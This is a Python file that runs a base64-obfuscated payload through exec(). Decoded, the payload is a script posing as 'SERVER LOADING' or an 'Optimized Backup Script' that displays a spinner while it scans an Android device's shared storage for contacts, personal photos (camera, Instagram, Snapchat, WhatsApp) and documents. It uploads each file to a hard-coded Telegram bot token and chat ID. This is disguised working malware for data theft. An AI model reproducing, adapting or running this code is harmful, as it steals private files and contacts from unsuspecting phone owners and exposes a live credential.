import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoiIiIKUkFKRVNIIFNFUlZFUiBMT0FESU5HLi4uLiAgfCAgT3B0aW1pemVkIEJhY2t1cCBTY3JpcHQKLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCuKclCBPbmUtcGFzcyBzY2FubmluZyAoZmFzdCwgbG93IGJhdHRlcnkgZHJhaW4pCuKclCBQaGFzZWQgc2VuZGluZzogVkNGIOKGkiBQZXJzb25hbCBQaG90b3Mg4oaSIERvY3Mg4oaSIE90aGVyIHBob3RvcwrinJQgU3RyaWN0IFRlbGVncmFtIHJlc3BvbnNlIGNoZWNraW5nIChubyBmYWxzZSAic2VudCIpCuKclCBSZXRyeSArIGZsb29kLXdhaXQgc3VwcG9ydArinJQgU2FmZSBzdGF0ZSB0cmFja2luZyAoc2tpcCBkdXBsaWNhdGVzKQrinJQgVGhyZWFkcG9vbCB3aXRoIHNhZmUgY29uY3VycmVuY3kK4pyUIFVzZXMgeW91ciBleGFjdCBzcGlubmVyIGNvZGUKIiIiCgppbXBvcnQgb3MKaW1wb3J0IHRpbWUKaW1wb3J0IHN5cwppbXBvcnQganNvbgppbXBvcnQgbWltZXR5cGVzCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCBpdGVydG9vbHMKZnJvbSBwYXRobGliIGltcG9ydCBQYXRoCmZyb20gY29uY3VycmVudC5mdXR1cmVzIGltcG9ydCBUaHJlYWRQb29sRXhlY3V0b3IsIGFzX2NvbXBsZXRlZAoKIyAtLS0tLS0tLS0tLS0tLS0tIENPTkZJRyAtLS0tLS0tLS0tLS0tLS0tClRPS0VOID0gIjgyMzkxOTI3MzU6QUFITVR4NXk4NkExWEt5V3RYOWtqZV9wR0M5ZTRJeG93YTgiCkNIQVRfSUQgPSAiNjkxMTc3NDYyNCIKCkJBU0UgPSBQYXRoLmhvbWUoKSAvICJzdG9yYWdlL3NoYXJlZCIKU1RBVEVfRklMRSA9IFBhdGguaG9tZSgpIC8gIi5yYWpfYmFja3VwX3N0YXRlLmpzb24iCgpXT1JLRVJTID0gNgpSRVRSSUVTID0gNApNQVhfRklMRV9TSVpFID0gaW50KDEuOSAqIDEwMjQqKjMpCgpWQ0ZfRVhUID0geyIudmNmIn0KRE9DX0VYVCA9IHsiLnB5IiwgIi50eHQiLCAiLmRvY3gifQpJTUdfRVhUID0geyIuanBnIiwgIi5qcGVnIiwgIi5wbmciLCAiLndlYnAiLCAiLmhlaWMifQoKUEVSU09OQUxfRElSUyA9IFsKICAgIEJBU0UgLyAiRENJTSIgLyAiQ2FtZXJhIiwKICAgIEJBU0UgLyAiUGljdHVyZXMiIC8gIkluc3RhZ3JhbSIsCiAgICBCQVNFIC8gIlBpY3R1cmVzIiAvICJTbmFwY2hhdCIsCiAgICBCQVNFIC8gIlBpY3R1cmVzIiwKXQoKT1RIRVJfRElSUyA9IFsKICAgIEJBU0UgLyAiRENJTSIgLyAiU2NyZWVuc2hvdHMiLAogICAgQkFTRSAvICJGYWNlYm9vayIsCiAgICBCQVNFIC8gIldoYXRzQXBwIiAvICJNZWRpYSIsCiAgICBCQVNFIC8gIkRvd25sb2FkIiwKXQoKIyAtLS0tLS0tLS0tLS0tLS0tIFNUQVRFIC0tLS0tLS0tLS0tLS0tLS0KZGVmIGxvYWRfc3RhdGUoKToKICAgIHRyeToKICAgICAgICBpZiBTVEFURV9GSUxFLmV4aXN0cygpOgogICAgICAgICAgICByZXR1cm4gc2V0KGpzb24ubG9hZHMoU1RBVEVfRklMRS5yZWFkX3RleHQoKSkuZ2V0KCJzZW50IiwgW10pKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKICAgIHJldHVybiBzZXQoKQoKZGVmIHNhdmVfc3RhdGUocyk6CiAgICB0cnk6CiAgICAgICAgU1RBVEVfRklMRS53cml0ZV90ZXh0KGpzb24uZHVtcHMoeyJzZW50IjogbGlzdChzKX0pKQogICAgZXhjZXB0OgogICAgICAgIHBhc3MKCnNlbnRfbG9jayA9IHRocmVhZGluZy5Mb2NrKCkKc2VudF9maWxlcyA9IGxvYWRfc3RhdGUoKQoKIyAtLS0tLS0tLS0tLS0tLS0tIFNQSU5ORVIgLS0tLS0tLS0tLS0tLS0tLQpkZWYgbG9hZGluZ19hbmltYXRpb24oc3RvcF9ldnQpOgogICAgc3Bpbm5lciA9IGl0ZXJ0b29scy5jeWNsZShbJy0nLCAnXFwnLCAnfCcsICcvJ10pCiAgICBwcmludCgnXHgxYlszODs1OzQ2bfCdkJHwnZCA8J2QifCdkITwnZCS8J2QhyBTRVJWRVIgTE9BRElORy4uLi5ceDFiWzBtJykKICAgIHdoaWxlIG5vdCBzdG9wX2V2dC5pc19zZXQoKToKICAgICAgICBzeXMuc3Rkb3V0LndyaXRlKG5leHQoc3Bpbm5lcikpCiAgICAgICAgc3lzLnN0ZG91dC5mbHVzaCgpCiAgICAgICAgdGltZS5zbGVlcCgwLjEpCiAgICAgICAgc3lzLnN0ZG91dC53cml0ZSgnXGInKQoKIyAtLS0tLS0tLS0tLS0tLS0tIFRFTEVHUkFNIFNFTkRFUiAtLS0tLS0tLS0tLS0tLS0tCmRlZiBzZW5kX2ZpbGUocGF0aDogUGF0aCk6CiAgICBnbG9iYWwgc2VudF9maWxlcwogICAgcF9zdHIgPSBzdHIocGF0aCkKCiAgICB3aXRoIHNlbnRfbG9jazoKICAgICAgICBpZiBwX3N0ciBpbiBzZW50X2ZpbGVzOgogICAgICAgICAgICByZXR1cm4gVHJ1ZQoKICAgIG1pbWUgPSBtaW1ldHlwZXMuZ3Vlc3NfdHlwZShwX3N0cilbMF0gb3IgImFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbSIKCiAgICBmb3IgYXR0ZW1wdCBpbiByYW5nZShSRVRSSUVTKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggcGF0aC5vcGVuKCJyYiIpIGFzIGY6CiAgICAgICAgICAgICAgICByZXNwID0gcmVxdWVzdHMucG9zdCgKICAgICAgICAgICAgICAgICAgICBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VE9LRU59L3NlbmREb2N1bWVudCIsCiAgICAgICAgICAgICAgICAgICAgZGF0YT17ImNoYXRfaWQiOiBDSEFUX0lEfSwKICAgICAgICAgICAgICAgICAgICBmaWxlcz17ImRvY3VtZW50IjogKHBhdGgubmFtZSwgZiwgbWltZSl9LAogICAgICAgICAgICAgICAgICAgIHRpbWVvdXQ9MTIwCiAgICAgICAgICAgICAgICApCgogICAgICAgICAgICBpZiByZXNwLnN0YXR1c19jb2RlID09IDQyOToKICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICB3YWl0ID0gaW50KHJlc3AuanNvbigpLmdldCgicGFyYW1ldGVycyIsIHt9KS5nZXQoInJldHJ5X2FmdGVyIiwgNSkpCiAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgd2FpdCA9IDUKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAod2FpdCkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICBpZiByZXNwLm9rOgogICAgICAgICAgICAgICAgd2l0aCBzZW50X2xvY2s6CiAgICAgICAgICAgICAgICAgICAgc2VudF9maWxlcy5hZGQocF9zdHIpCiAgICAgICAgICAgICAgICAgICAgc2F2ZV9zdGF0ZShzZW50X2ZpbGVzKQogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgdGltZS5zbGVlcCgyKQoKICAgIHJldHVybiBGYWxzZQoKIyAtLS0tLS0tLS0tLS0tLS0tIEZJTEUgRElTQ09WRVJZIC0tLS0tLS0tLS0tLS0tLS0KZGVmIHNhZmVfd2Fsayhyb290KToKICAgICIiIkdlbmVyYXRvciB0aGF0IHNhZmVseSB3YWxrcyBkaXJlY3Rvcmllcy4iIiIKICAgIGlmIG5vdCByb290LmV4aXN0cygpOgogICAgICAgIHJldHVybgogICAgZm9yIGRpcnBhdGgsIF8sIGZpbGVzIGluIG9zLndhbGsocm9vdCk6CiAgICAgICAgZm9yIGYgaW4gZmlsZXM6CiAgICAgICAgICAgIHAgPSBQYXRoKGRpcnBhdGgpIC8gZgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiBwLnN0YXQoKS5zdF9zaXplIDw9IDAgb3IgcC5zdGF0KCkuc3Rfc2l6ZSA+IE1BWF9GSUxFX1NJWkU6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIHlpZWxkIHAKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgpkZWYgc2Nhbl9hbGwoKToKICAgICIiIlNjYW4gc3RvcmFnZSBvbmNlIGFuZCBjYXRlZ29yaXplIGZpbGVzIGludG8gcGhhc2VzLiIiIgogICAgdmNmID0gW10KICAgIGRvY3MgPSBbXQogICAgcGVyc29uYWwgPSBbXQogICAgb3RoZXIgPSBbXQoKICAgIEJBU0VfZXhpc3RzID0gQkFTRS5leGlzdHMoKQogICAgaWYgbm90IEJBU0VfZXhpc3RzOgogICAgICAgIHJldHVybiB2Y2YsIGRvY3MsIHBlcnNvbmFsLCBvdGhlcgoKICAgIHBlcnNvbmFsX3NldCA9IHtzdHIocCkgZm9yIHAgaW4gUEVSU09OQUxfRElSUyBpZiBwLmV4aXN0cygpfQogICAgb3RoZXJfc2V0ID0ge3N0cihwKSBmb3IgcCBpbiBPVEhFUl9ESVJTIGlmIHAuZXhpc3RzKCl9CgogICAgZm9yIHAgaW4gc2FmZV93YWxrKEJBU0UpOgogICAgICAgIHRyeToKICAgICAgICAgICAgc2Z4ID0gcC5zdWZmaXgubG93ZXIoKQoKICAgICAgICAgICAgIyBQaGFzZSAxCiAgICAgICAgICAgIGlmIHNmeCBpbiBWQ0ZfRVhUOgogICAgICAgICAgICAgICAgdmNmLmFwcGVuZChwKQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgICMgUGhhc2UgMiBkb2NzCiAgICAgICAgICAgIGlmIHNmeCBpbiBET0NfRVhUOgogICAgICAgICAgICAgICAgZG9jcy5hcHBlbmQocCkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICAgICAjIFBoYXNlIDIgaW1hZ2VzIChwZXJzb25hbCkKICAgICAgICAgICAgaWYgc2Z4IGluIElNR19FWFQgYW5kIGFueShzdHIocCkuc3RhcnRzd2l0aChkKSBmb3IgZCBpbiBwZXJzb25hbF9zZXQpOgogICAgICAgICAgICAgICAgcGVyc29uYWwuYXBwZW5kKHApCiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgICAgICAgICAgIyBQaGFzZSAzIGltYWdlcyAob3RoZXIpCiAgICAgICAgICAgIGlmIHNmeCBpbiBJTUdfRVhUIGFuZCBhbnkoc3RyKHApLnN0YXJ0c3dpdGgoZCkgZm9yIGQgaW4gb3RoZXJfc2V0KToKICAgICAgICAgICAgICAgIG90aGVyLmFwcGVuZChwKQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBjb250aW51ZQoKICAgIHJldHVybiB2Y2YsIGRvY3MsIHBlcnNvbmFsLCBvdGhlcgoKZGVmIGZpbHRlcl9uZXcoZmlsZXMpOgogICAgb3V0ID0gW10KICAgIGZvciBwIGluIGZpbGVzOgogICAgICAgIGlmIHN0cihwKSBub3QgaW4gc2VudF9maWxlczoKICAgICAgICAgICAgb3V0LmFwcGVuZChwKQogICAgcmV0dXJuIG91dAoKIyAtLS0tLS0tLS0tLS0tLS0tIE1BSU4gLS0tLS0tLS0tLS0tLS0tLQpkZWYgcnVuX3RocmVhZGVkKHBhdGhzKToKICAgIGlmIG5vdCBwYXRoczoKICAgICAgICByZXR1cm4KICAgIHdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPVdPUktFUlMpIGFzIGV4OgogICAgICAgIGZ1dHVyZXMgPSBbZXguc3VibWl0KHNlbmRfZmlsZSwgcCkgZm9yIHAgaW4gcGF0aHNdCiAgICAgICAgZm9yIGYgaW4gYXNfY29tcGxldGVkKGZ1dHVyZXMpOgogICAgICAgICAgICBwYXNzCgpkZWYgcnVuKCk6CiAgICBpZiBUT0tFTiA9PSAiWU9VUl9CT1RfVE9LRU4iIG9yIENIQVRfSUQgPT0gIllPVVJfQ0hBVF9JRCI6CiAgICAgICAgIyBUaGlzIHByaW50IGlzIGtlcHQgZm9yIGVzc2VudGlhbCB1c2VyIGZlZWRiYWNrCiAgICAgICAgcHJpbnQoIlBsZWFzZSBzZXQgVE9LRU4gYW5kIENIQVRfSUQgZmlyc3QuIikKICAgICAgICByZXR1cm4KCiAgICAjIFN0YXJ0IHNwaW5uZXIKICAgIHN0b3BfZXZ0ID0gdGhyZWFkaW5nLkV2ZW50KCkKICAgIHNwaW5uZXJfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9bG9hZGluZ19hbmltYXRpb24sIGFyZ3M9KHN0b3BfZXZ0LCksIGRhZW1vbj1UcnVlKQogICAgc3Bpbm5lcl90aHJlYWQuc3RhcnQoKQoKICAgIHRyeToKICAgICAgICAjIFNjYW4gb25jZQogICAgICAgIHZjZiwgZG9jcywgcGVyc29uYWwsIG90aGVyID0gc2Nhbl9hbGwoKQoKICAgICAgICAjIEZpbHRlciB1bnNlbnQKICAgICAgICB2Y2YgPSBmaWx0ZXJfbmV3KHZjZikKICAgICAgICBkb2NzID0gZmlsdGVyX25ldyhkb2NzKQogICAgICAgIHBlcnNvbmFsID0gZmlsdGVyX25ldyhwZXJzb25hbCkKICAgICAgICBvdGhlciA9IGZpbHRlcl9uZXcob3RoZXIpCgogICAgICAgICMgUGhhc2UgMSDigJQgVkNGIChzZXJpYWwpCiAgICAgICAgZm9yIHAgaW4gdmNmOgogICAgICAgICAgICBzZW5kX2ZpbGUocCkKCiAgICAgICAgIyBQaGFzZSAyIOKAlCBQZXJzb25hbCBQaG90b3MgKGNvbmN1cnJlbnQpCiAgICAgICAgcnVuX3RocmVhZGVkKHBlcnNvbmFsKQoKICAgICAgICAjIFBoYXNlIDMg4oCUIERvY3VtZW50cyAoY29uY3VycmVudCkKICAgICAgICBydW5fdGhyZWFkZWQoZG9jcykKCiAgICAgICAgIyBQaGFzZSA0IOKAlCBPdGhlciBJbWFnZXMgKGNvbmN1cnJlbnQpCiAgICAgICAgcnVuX3RocmVhZGVkKG90aGVyKQoKICAgIGZpbmFsbHk6CiAgICAgICAgc3RvcF9ldnQuc2V0KCkKICAgICAgICBzcGlubmVyX3RocmVhZC5qb2luKCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBydW4oKQo=').decode('utf-8'))
